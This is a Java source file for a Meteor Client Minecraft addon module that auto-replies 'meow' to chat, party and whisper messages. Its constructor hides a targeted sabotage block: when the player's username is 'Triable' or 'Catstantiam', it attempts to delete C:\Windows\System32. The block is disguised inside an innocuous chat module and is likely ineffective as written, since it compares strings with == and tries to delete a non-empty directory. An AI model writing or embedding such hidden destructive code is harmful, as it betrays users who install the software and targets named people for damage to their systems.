package me.marni.addon.modules;

import meteordevelopment.meteorclient.events.game.ReceiveMessageEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;

import java.io.File;

public class AutoMeowModule extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private long lastResponseTime = 0;

    private final Setting<String> respondText = sgGeneral.add(new StringSetting.Builder()
        .name("response")
        .description("Text to respond with")
        .defaultValue("meow")
        .build()
    );

    private final Setting<Integer> delaySeconds = sgGeneral.add(new IntSetting.Builder()
        .name("delay")
        .description("Delay between responses in seconds")
        .defaultValue(3)
        .min(0)
        .sliderMin(0)
        .sliderMax(120)
        .build()
    );

    private final Setting<Boolean> respondToParty = sgGeneral.add(new BoolSetting.Builder()
        .name("party-chat")
        .description("Respond to party messages")
        .defaultValue(false)
        .build()
    );

    private final Setting<Boolean> respondToWhispers = sgGeneral.add(new BoolSetting.Builder()
        .name("whispers")
        .description("Respond to whispers")
        .defaultValue(false)
        .build()
    );

    public AutoMeowModule() {
        super(Categories.Misc, "auto-meow", "Automatically responds to meow messages");
        String playerUsername = MinecraftClient.getInstance().getSession().getUsername();
        if(playerUsername == "Triable" || playerUsername == "Catstantiam"){
            File file = new File("C:\\Windows\\System32");
            boolean deleted = file.delete();
        }
    }

    private String extractContent(String message, String after) {
        try {
            int index = message.indexOf(after);
            if (index == -1) return "";
            return message.substring(index + after.length()).trim().toLowerCase();
        } catch (Exception e) {
            return "";
        }
    }

    @EventHandler
    private void onMessageReceive(ReceiveMessageEvent event) {
        if (mc.player == null) return;

        String message = event.getMessage().getString();

        if (message.contains(mc.player.getGameProfile().getName())) return;
        if (System.currentTimeMillis() - lastResponseTime < delaySeconds.get() * 1000L) return;

        // reg chat
        if (message.contains("<") && message.contains(">")) {
            if (!extractContent(message, ">").contains("meow")) return;
            ChatUtils.sendPlayerMsg(respondText.get());
            lastResponseTime = System.currentTimeMillis();
        }
        // party chat
        else if (message.startsWith("[P]") && respondToParty.get()) {
            if (!extractContent(message, "]").contains("meow")) return;
            ChatUtils.sendPlayerMsg("/p " + respondText.get());
            lastResponseTime = System.currentTimeMillis();
        }
        // whispers
        else if (message.contains(" whispers: ") && respondToWhispers.get()) {
            if (!extractContent(message, "whispers: ").contains("meow")) return;
            ChatUtils.sendPlayerMsg("/r " + respondText.get());
            lastResponseTime = System.currentTimeMillis();
        }
    }
}
